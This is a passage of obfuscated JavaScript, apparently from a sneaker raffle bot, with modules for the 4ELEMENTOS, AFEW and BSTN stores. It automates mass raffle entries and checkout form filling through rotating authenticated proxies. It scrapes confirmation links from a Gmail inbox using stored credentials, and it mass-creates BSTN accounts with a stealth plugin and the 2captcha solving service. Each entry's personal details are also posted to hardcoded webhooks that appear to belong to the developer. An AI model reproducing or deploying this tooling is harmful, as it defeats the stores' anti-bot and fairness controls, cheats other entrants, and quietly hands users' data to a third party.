                            }), await _0x3143aa['goto'](_0x3ae6b0[_0x2880a8]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x38a61b() + '\x20[' + _0x475c46['name'] + ']\x20Task\x20' + (_0x2880a8 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x3143aa['waitForSelector']('#accept-all-gdpr'), await _0x3143aa['click']('#accept-all-gdpr'), await _0x3143aa['waitForSelector']('#raffles-product'), await _0xbbd9dc(0x3e8), await _0x3143aa['$eval']('#raffles-product', _0x5412b3 => _0x5412b3['click']()), await _0xbbd9dc(0x1388), await _0x3143aa['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x376772 = await _0x3143aa['$']('.fancybox-inner\x20>\x20iframe'), _0x3bbd9a = await _0x376772['contentFrame']();
                            console['log'](_0x38a61b() + '\x20[' + _0x475c46['name'] + ']\x20Task\x20' + (_0x2880a8 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x3bbd9a['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0xbbd9dc(0x1f4), await _0x3bbd9a['type']('input[name=\x22sm-form-email\x22]', _0x3ae6b0[_0x2880a8]['Email']), await _0xbbd9dc(0xc8), await _0x3bbd9a['type']('input[name=\x22sm-form-name\x22]', _0x3ae6b0[_0x2880a8]['FirstName'] + '\x20' + _0x3ae6b0[_0x2880a8]['LastName']), await _0xbbd9dc(0xc8), await _0x3bbd9a['type']('input[name=\x22sm-form-street\x22]', _0x3ae6b0[_0x2880a8]['Address1'] + '\x20' + _0x3ae6b0[_0x2880a8]['HouseNumber'] + '\x20' + _0x3ae6b0[_0x2880a8]['Address2']), await _0xbbd9dc(0xc8), await _0x3bbd9a['type']('input[name=\x22sm-form-city\x22]', _0x3ae6b0[_0x2880a8]['City']), await _0xbbd9dc(0xc8), await _0x3bbd9a['type']('input[name=\x22sm-form-province\x22]', _0x3ae6b0[_0x2880a8]['State']), await _0xbbd9dc(0xc8), await _0x3bbd9a['type']('input[name=\x22sm-form-zip\x22]', _0x3ae6b0[_0x2880a8]['Zip']), await _0xbbd9dc(0xc8), await _0x3bbd9a['type']('input[name=\x22sm-form-country\x22]', _0x3ae6b0[_0x2880a8]['Country']), await _0xbbd9dc(0xc8), await _0x3bbd9a['type']('input[name=\x22sm-form-phone\x22]', _0x3ae6b0[_0x2880a8]['Phone']), await _0xbbd9dc(0xc8), await _0x3bbd9a['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x3ae6b0[_0x2880a8]['Follower']), await _0xbbd9dc(0xc8), await _0x3bbd9a['type']('input[name=\x22sm-cst.size\x22]', _0x3ae6b0[_0x2880a8]['Size']), await _0xbbd9dc(0x1f4), await _0x3bbd9a['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0xbbd9dc(0x1f4), await _0x3bbd9a['click']('.icheckbox_simple-custom'), await _0xbbd9dc(0x1f4), console['log'](_0x38a61b() + '\x20[' + _0x475c46['name'] + ']\x20Task\x20' + (_0x2880a8 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x3bbd9a['$eval']('form', _0x4ad709 => _0x4ad709['submit']()), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x475c46['name'] + ']\x20Task\x20' + (_0x2880a8 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x53a13d = '';
                            var _0x5bbde9 = await _0x23dc1b(_0x3ae6b0[_0x2880a8], _0x475c46, 'dev', ![]), _0x4fd7c6 = await _0x23dc1b(_0x3ae6b0[_0x2880a8], _0x475c46, 'pub', ![]);
                            const _0x958742 = {
                                'succesDEVMSG': { 'embeds': [_0x5bbde9] },
                                'succesPUBMSG': { 'embeds': [_0x4fd7c6] }
                            };
                            try {
                                _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x958742['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x958742['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x4d6262, _0x958742['succesPUBMSG']);
                            } catch (_0x1f3f2a) {
                                console['log'](_0x19e6c5['yellow'](_0x38a61b() + '\x20[' + _0x475c46['name'] + ']\x20Task\x20' + (_0x2880a8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1f3f2a));
                            }
                        } catch (_0xab9ea7) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x475c46['name'] + ']\x20Task\x20' + (_0x2880a8 + 0x1) + '\x20:\x20' + _0xab9ea7)), _0x143a01 = '' + _0xab9ea7;
                            var _0x4e75e2 = await _0x23dc1b(_0x3ae6b0[_0x2880a8], _0x475c46, 'dev', !![], _0x143a01), _0x5bbde9 = await _0x23dc1b(_0x3ae6b0[_0x2880a8], _0x475c46, 'dev', ![]), _0x4fd7c6 = await _0x23dc1b(_0x3ae6b0[_0x2880a8], _0x475c46, 'pub', ![]);
                            const _0x3f9539 = {
                                'succesDEVMSG': { 'embeds': [_0x5bbde9] },
                                'succesPUBMSG': { 'embeds': [_0x4fd7c6] }
                            };
                            _0x3f9539['errorDEV'] = { 'embeds': [_0x4e75e2] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x3f9539['errorDEV']), await _0x4236dd(_0x48c50b, _0x3f9539['errorDEV']), _0xab9ea7 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x53a13d = 'yes');
                        } finally {
                            _0x1c3c61['close']();
                            if (_0x53a13d == 'yes' && _0x50b6a1 != 0x5 && _0x143a01 != 'Size\x20Not\x20Found') {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x475c46['name'] + ']\x20Task\x20' + (_0x2880a8 + 0x1) + '\x20:\x20Retrying')), _0x2880a8 = _0x2880a8 - 0x1, _0x50b6a1 = _0x50b6a1 + 0x1;
                                continue;
                            }
                            _0x53a13d == 'yes' && _0x50b6a1 >= 0x5 && (_0xc8d9fd(_0x3ae6b0[_0x2880a8], _0x475c46), _0x53a13d = 'no', _0x50b6a1 = 0x0), console['log'](_0x38a61b() + '\x20[' + _0x475c46['name'] + ']\x20Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x2374cc, _0x5966f4) {
                    var _0x18b02f = [];
                    async function _0x5c8443() {
                        var _0x33e2b5 = new _0x9597be({
                            'user': _0x9a51aa['masterMail'],
                            'password': _0x9a51aa['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x410678(_0x191397) {
                            _0x33e2b5['openBox']('INBOX', ![], _0x191397);
                        }
                        _0x33e2b5['once']('ready', function () {
                            _0x410678(function (_0x3a1d3b, _0x36bae7) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3a1d3b)
                                    throw _0x3a1d3b;
                                _0x33e2b5['seq']['search'](['UNSEEN'], function (_0x5a2b0d, _0x48a5d2) {
                                    if (!_0x48a5d2 || !_0x48a5d2['length'])
                                        console['log'](_0x38a61b() + '\x20[' + _0x2374cc['name'] + ']\x20No\x20mails\x20found'), _0x33e2b5['end']();
                                    else {
                                        var _0x4cde60 = _0x33e2b5['seq']['fetch'](_0x48a5d2, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4cde60['on']('message', function (_0x14ea6e, _0x3608c6) {
                                            var _0x5a9ac3 = '(#' + _0x3608c6 + ')\x20';
                                            _0x14ea6e['on']('body', function (_0x558b55, _0x232071) {
                                                _0x45ab86(_0x558b55, (_0x22ee5a, _0x49275b) => {
                                                    if (_0x49275b['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x3feae2 = _0x49275b['html']['split']('\x0a');
                                                        for (var _0x4c4286 = 0x0; _0x4c4286 < _0x3feae2['length']; _0x4c4286++) {
                                                            if (_0x3feae2[_0x4c4286]['includes']('salesmanago') && _0x3feae2[_0x4c4286]['includes']('<td') && _0x3feae2[_0x4c4286]['includes']('href')) {
                                                                var _0x78daba = _0x3feae2[_0x4c4286]['split']('href=\x22'), _0xfdd8b3 = _0x78daba[0x1]['split']('\x22')[0x0];
                                                                _0x18b02f['push'](_0xfdd8b3);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x14ea6e['once']('end', function () {
                                            });
                                        }), _0x4cde60['once']('error', function (_0x25e800) {
                                            console['log']('Fetch\x20error:\x20' + _0x25e800);
                                        }), _0x4cde60['once']('end', function () {
                                            _0x33e2b5['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x33e2b5['once']('error', function (_0x1b1523) {
                            console['log'](_0x19e6c5['red'](_0x1b1523['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x33e2b5['once']('end', async function () {
                        }), _0x33e2b5['connect']();
                    }
                    async function _0x1399c6(_0x30da20, _0x17edfb, _0x1f93b2) {
                        for (var _0x1281d3 = 0x0; _0x1281d3 < _0x17edfb['length']; _0x1281d3++) {
                            async function _0x2a8346(_0x5567d0, _0x41aceb, _0x31041a, _0x22c3a7, _0xa907f9) {
                                var _0x4f66a5, _0x2cc500 = {}, _0x3adfcc = [], _0x48fd5a = {}, _0x195057 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4eae0e = Math['round'](Math['random']() * (_0x195057['length'] - 0x1));
                                _0x22c3a7[_0x5567d0]['Size'] == 'RANDOM' && (_0x22c3a7[_0x5567d0]['Size'] = _0x195057[_0x4eae0e]);
                                !_0x22c3a7 && (_0x22c3a7 = {});
                                if (_0x9a51aa['useRandomProxy'] = ![])
                                    var _0x14709d = _0xa907f9[_0x5567d0]['split'](':');
                                else
                                    var _0x55358d = Math['round'](Math['random']() * (_0xa907f9['length'] - 0x1)), _0x14709d = _0xa907f9[_0x55358d]['split'](':');
                                var _0x22875e = {
                                    'jar': _0x3720c0,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x31041a['url'],
                                    'headers': _0x31041a['headers'],
                                    'body': JSON['stringify'](_0x2cc500),
                                    'proxy': 'http://' + _0x14709d[0x2] + ':' + _0x14709d[0x3] + '@' + _0x14709d[0x0] + ':' + _0x14709d[0x1]
                                };
                                return _0x41aceb != 'ver' && (_0x22875e['url'] = _0x31041a['url'], _0x22875e['headers'] = _0x31041a['headers']), _0x41aceb == 'ver' && (_0x22875e['method'] = 'GET', _0x22875e['url'] = _0x22c3a7[_0x5567d0]), new Promise(function (_0x4c9546, _0x5dd37f) {
                                    callback = async (_0x3d4737, _0x55d78f, _0x15ae04) => {
                                        if (!_0x3d4737 && _0x55d78f['statusCode'] == 0xca || !_0x3d4737 && _0x55d78f['statusCode'] == 0xc8) {
                                            if (_0x41aceb != 'ver') {
                                                var _0x52d509 = await _0x23dc1b(_0x22c3a7[_0x5567d0], _0x31041a, 'dev', ![]), _0x9a2bf8 = await _0x23dc1b(_0x22c3a7[_0x5567d0], _0x31041a, 'pub', ![]);
                                                const _0x3210c8 = {
                                                    'succesDEVMSG': { 'embeds': [_0x52d509] },
                                                    'succesPUBMSG': { 'embeds': [_0x9a2bf8] }
                                                };
                                                if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                                                    try {
                                                        await _0x4236dd(_0x9a51aa['webhook'], _0x3210c8['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x3210c8['succesDEVMSG']), await _0xbbd9dc(0xc8);
                                                try {
                                                    await _0x4236dd(_0x4d6262, _0x3210c8['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5d1d0f(_0x22c3a7[_0x5567d0], _0x31041a);
                                            }
                                            _0x4c9546(console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x31041a['name'] + ']\x20Task\x20' + (_0x5567d0 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x41aceb != 'ver') {
                                                var _0x2c3094 = '' + _0x3d4737, _0x113cd1 = await _0x23dc1b(_0x22c3a7[_0x5567d0], _0x31041a, 'dev', !![], _0x2c3094), _0x2391db = {};
                                                _0x2391db['errorDEV'] = { 'embeds': [_0x113cd1] }, _0xc8d9fd(_0x22c3a7[_0x5567d0], _0x31041a), _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x2391db['errorDEV']), await _0x4236dd(_0x48c50b, _0x2391db['errorDEV']);
                                            }
                                            _0x5dd37f(console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x31041a['name'] + ']\x20Task\x20' + (_0x5567d0 + 0x1) + ':\x20' + _0x3d4737)));
                                        }
                                    };
                                    try {
                                        _0x41aceb != 'ver' ? console['log'](_0x38a61b() + '\x20[' + _0x31041a['name'] + ']\x20Task\x20' + (_0x5567d0 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2cc500['data']['attributes']['email']) : console['log'](_0x38a61b() + '\x20[' + _0x31041a['name'] + ']\x20Task\x20' + (_0x5567d0 + 0x1) + ':\x20Fetching\x20Response'), _0x355e6b(_0x22875e, callback);
                                    } catch (_0x2ff368) {
                                        console['log'](_0x38a61b() + '\x20Task\x20' + (_0x5567d0 + 0x1) + ':\x20' + _0x2ff368);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2a8346(_0x1281d3, 'ver', _0x30da20, _0x17edfb, _0x1f93b2), console['log'](_0x38a61b() + '\x20[' + _0x30da20['name'] + ']\x20Sleeping\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                            } catch (_0x2212da) {
                            }
                        }
                    }
                    try {
                        _0x5c8443(), await _0xbbd9dc(0xfa0), console['log']('Found\x20' + _0x18b02f['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x1399c6(_0x2374cc, _0x18b02f, _0x5966f4);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x2382b2, _0x85efba, _0x10537c) {
                for (var _0x3dcf63 = 0x0; _0x3dcf63 < _0x85efba['length']; _0x3dcf63++) {
                    _0x9a51aa['AfewDelay'] = _0x9a51aa['delay'];
                    var _0x20b8dc;
                    if (_0x1d4d26 != 'yes')
                        var _0x1d4d26 = '', _0x172e50 = 0x0;
                    var _0x6ffbff = _0x85efba[_0x3dcf63]['Url'];
                    _0x1f02d2(_0x2382b2['name'] + '\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20/\x20' + _0x85efba['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x85efba, _0x3dcf63);
                    var _0x214bda = await _0x23dc1b(_0x85efba[_0x3dcf63], _0x2382b2, 'dev', ![]), _0x573e94 = await _0x23dc1b(_0x85efba[_0x3dcf63], _0x2382b2, 'pub', ![]);
                    const _0x142b9d = {
                        'succesDEVMSG': { 'embeds': [_0x214bda] },
                        'succesPUBMSG': { 'embeds': [_0x573e94] }
                    };
                    if (_0x85efba[_0x3dcf63]['Email'] == '' || _0x85efba[_0x3dcf63]['FirstName'] == '' || _0x85efba[_0x3dcf63]['LastName'] == '' || _0x85efba[_0x3dcf63]['Country'] == '' || _0x85efba[_0x3dcf63]['Size'] == '' || _0x85efba[_0x3dcf63]['Address1'] == '' || _0x85efba[_0x3dcf63]['Zip'] == '') {
                        console['log'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x9a51aa['useRandomProxy'] = ![])
                        var _0x54208d = _0x10537c[_0x3dcf63]['split'](':');
                    else
                        var _0x1646de = Math['round'](Math['random']() * (_0x10537c['length'] - 0x1)), _0x54208d = _0x10537c[_0x1646de]['split'](':');
                    const _0x478c37 = await _0x6d7b51['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x54208d[0x0] + ':' + _0x54208d[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x108c4f = await _0x478c37['newPage']();
                        await _0x108c4f['setDefaultNavigationTimeout'](0x1d4c0), await _0x108c4f['authenticate']({
                            'username': '' + _0x54208d[0x2],
                            'password': '' + _0x54208d[0x3]
                        }), console['log'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x108c4f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x108c4f['setRequestInterception'](!![]), _0x108c4f['on']('request', _0x552398 => {
                            _0x552398['resourceType']() === 'image' || _0x552398['resourceType']() === 'font' || _0x552398['resourceType']() === 'media' ? _0x552398['abort']() : _0x552398['continue']();
                        }), await _0x108c4f['goto'](_0x6ffbff, { 'waitUntil': 'networkidle2' }), console['log'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x108c4f['waitForTimeout'](0xfa0), console['log'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x108c4f['waitForTimeout'](0x320);
                        if (_0x85efba[_0x3dcf63]['Size'] == 'RANDOM') {
                            console['log'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0x2bf1a7 = await _0x108c4f['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x532016 => {
                                return _0x532016['map'](_0x88a40c => _0x88a40c['href']);
                            });
                            var _0x244b82 = Math['round'](Math['random']() * (_0x2bf1a7['length'] - 0x1));
                            await _0x108c4f['goto']('' + _0x2bf1a7[_0x244b82]);
                        } else {
                            console['log'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x85efba[_0x3dcf63]['Size']);
                            try {
                                const _0x2a26a3 = await _0x108c4f['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x85efba[_0x3dcf63]['Size'] + '\x22]\x20>\x20a', _0x1e3f50 => {
                                    return _0x1e3f50['map'](_0x1146d2 => _0x1146d2['href']);
                                });
                                await _0x108c4f['goto']('' + _0x2a26a3[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x2c66e2) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20' + _0x2c66e2 + '\x20Size\x20not\x20found')), _0x20b8dc = 'Size\x20Not\x20Found';
                                var _0x48ae35 = await _0x23dc1b(_0x85efba[_0x3dcf63], _0x2382b2, 'dev', !![], _0x20b8dc);
                                _0x142b9d['errorDEV'] = { 'embeds': [_0x48ae35] };
                                _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x142b9d['errorDEV']);
                                await _0x4236dd(_0x48c50b, _0x142b9d['errorDEV']);
                                continue;
                            }
                        }
                        await _0x108c4f['waitForTimeout'](0x258), await _0x108c4f['type']('#raffle-instagram', '' + _0x85efba[_0x3dcf63]['Follower'], { 'delay': 0x64 }), await _0x108c4f['waitForTimeout'](0x384), await _0x108c4f['click']('#raffle-terms'), await _0x108c4f['waitForTimeout'](0x384), await _0x108c4f['evaluate'](() => {
                            const _0x24ccff = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x24ccff['click']();
                        }), await _0x108c4f['waitForTimeout'](0xbb8), await _0x108c4f['waitForSelector']('#checkout_email'), await _0xbbd9dc(0x3e8), console['log'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x108c4f['type']('#checkout_email', '' + _0x85efba[_0x3dcf63]['Email'], 0x32), await _0xbbd9dc(0x320), await _0x108c4f['select']('#checkout_shipping_address_country', '' + _0x85efba[_0x3dcf63]['Country']), await _0x108c4f['waitForTimeout'](0x258), await _0x108c4f['type']('#checkout_shipping_address_first_name', '' + _0x85efba[_0x3dcf63]['FirstName']), await _0x108c4f['waitForTimeout'](0x320), await _0x108c4f['type']('#checkout_shipping_address_last_name', '' + _0x85efba[_0x3dcf63]['LastName']), await _0x108c4f['waitForTimeout'](0x2bc), await _0x108c4f['type']('#checkout_shipping_address_address1', _0x85efba[_0x3dcf63]['Address1'] + '\x20' + _0x85efba[_0x3dcf63]['HouseNumber']), await _0x108c4f['waitForTimeout'](0x2bc), await _0x108c4f['type']('#checkout_shipping_address_address2', '' + _0x85efba[_0x3dcf63]['Address2']), await _0x108c4f['waitForTimeout'](0x2bc);
                        _0x85efba[_0x3dcf63]['Postcode'] == undefined ? await _0x108c4f['type']('#checkout_shipping_address_zip', '' + _0x85efba[_0x3dcf63]['Zip']) : await _0x108c4f['type']('#checkout_shipping_address_zip', '' + _0x85efba[_0x3dcf63]['Postcode']);
                        await _0x108c4f['waitForTimeout'](0x2bc), await _0x108c4f['type']('#checkout_shipping_address_city', '' + _0x85efba[_0x3dcf63]['City']), await _0x108c4f['waitForTimeout'](0x2bc), console['log'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x108c4f, _0x108c4f['evaluate'](() => {
                            const _0x2b0259 = document['querySelector']('#continue_button');
                            for (var _0x389e78 = 0x0; _0x389e78 < 0x5; _0x389e78++) {
                                if (_0x2b0259) {
                                    _0x2b0259['click'](), _0x2b0259['click']();
                                    break;
                                } else
                                    _0xbbd9dc(0xfa0);
                            }
                        }), await _0x108c4f['waitForTimeout'](0x1194);
                        try {
                            await _0x108c4f['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x108c4f['evaluate'](() => {
                            const _0x511d3a = document['querySelector']('#continue_button');
                            for (var _0x42e14a = 0x0; _0x42e14a < 0x5; _0x42e14a++) {
                                if (_0x511d3a) {
                                    _0x511d3a['click']();
                                    break;
                                } else
                                    _0xbbd9dc(0xfa0);
                            }
                        }), await _0x108c4f['waitForTimeout'](0x7d0), console['log'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x108c4f['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x108c4f['evaluate'](() => {
                            const _0x556cfe = document['querySelector']('#continue_button');
                            for (var _0x2a987b = 0x0; _0x2a987b < 0x5; _0x2a987b++) {
                                if (_0x556cfe) {
                                    _0x556cfe['click']();
                                    break;
                                } else
                                    _0xbbd9dc(0xfa0);
                            }
                        }), await _0x108c4f['waitForTimeout'](0x1194), await _0x108c4f['waitForSelector']('#continue_button'), _0x108c4f['evaluate'](() => {
                            const _0x4ae4eb = document['querySelector']('#continue_button');
                            for (var _0x2b877c = 0x0; _0x2b877c < 0x5; _0x2b877c++) {
                                if (_0x4ae4eb) {
                                    _0x4ae4eb['click']();
                                    break;
                                } else
                                    _0xbbd9dc(0xfa0);
                            }
                        });
                        try {
                            await _0x108c4f['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x1d4d26 = 'no', _0x5d1d0f(_0x85efba[_0x3dcf63], _0x2382b2), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                                try {
                                    await _0x4236dd(_0x9a51aa['webhook'], _0x142b9d['succesDEVMSG']);
                                } catch {
                                }
                            await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x142b9d['succesDEVMSG']), await _0xbbd9dc(0xc8);
                            try {
                                await _0x4236dd(_0x4d6262, _0x142b9d['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x40eb51) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x40eb51));
                        }
                    } catch (_0x596771) {
                        console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20' + _0x596771)), _0x20b8dc = '' + _0x596771;
                        var _0x48ae35 = await _0x23dc1b(_0x85efba[_0x3dcf63], _0x2382b2, 'dev', !![], _0x20b8dc);
                        _0x142b9d['errorDEV'] = { 'embeds': [_0x48ae35] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x142b9d['errorDEV']), await _0x4236dd(_0x48c50b, _0x142b9d['errorDEV']), _0x1d4d26 = 'yes';
                    } finally {
                        _0x478c37 && _0x478c37['close']();
                        if (_0x1d4d26 == 'yes' && _0x172e50 != 0x5 && _0x20b8dc != 'Size\x20Not\x20Found') {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2382b2['name'] + ']\x20Task\x20' + (_0x3dcf63 + 0x1) + '\x20:\x20Retrying')), _0x3dcf63 = _0x3dcf63 - 0x1, _0x172e50 = _0x172e50 + 0x1;
                            continue;
                        }
                        _0x1d4d26 == 'yes' && _0x172e50 >= 0x5 && (_0xc8d9fd(_0x85efba[_0x3dcf63], _0x2382b2), _0x1d4d26 = 'no', _0x172e50 = 0x0);
                        if (_0x3dcf63 + 0x1 == _0x85efba['length']) {
                            await _0xbbd9dc(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x9a51aa['AfewDelay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x57147e, _0x5680b2, _0xa82cc3) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x48f860 = 0x0; _0x48f860 < _0x5680b2['length']; _0x48f860++) {
                        if (_0x1c5a83 != 'yes')
                            var _0x1c5a83 = '', _0x5eaa25 = 0x0;
                        var _0x394b52;
                        await _0x2f5330(_0x5680b2, _0x48f860), _0x1f02d2(_0x57147e['name'] + '\x20Task\x20' + (_0x48f860 + 0x1) + '\x20/\x20' + _0x5680b2['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa);
                        var _0x70d404 = await _0x23dc1b(_0x5680b2[_0x48f860], _0x57147e, 'acc', ![]);
                        const _0x327732 = { 'succesDEVMSG': { 'embeds': [_0x70d404] } }, _0x4f47be = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x422874 = Math['round'](Math['random']() * (_0xa82cc3['length'] - 0x1)), _0x367225 = _0xa82cc3[_0x422874]['split'](':');
                        const _0x1a4c21 = await _0x6d7b51['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x367225[0x0] + ':' + _0x367225[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0xd8ecf2 = await _0x1a4c21['newPage']();
                            await _0xd8ecf2['authenticate']({
                                'username': '' + _0x367225[0x2],
                                'password': '' + _0x367225[0x3]
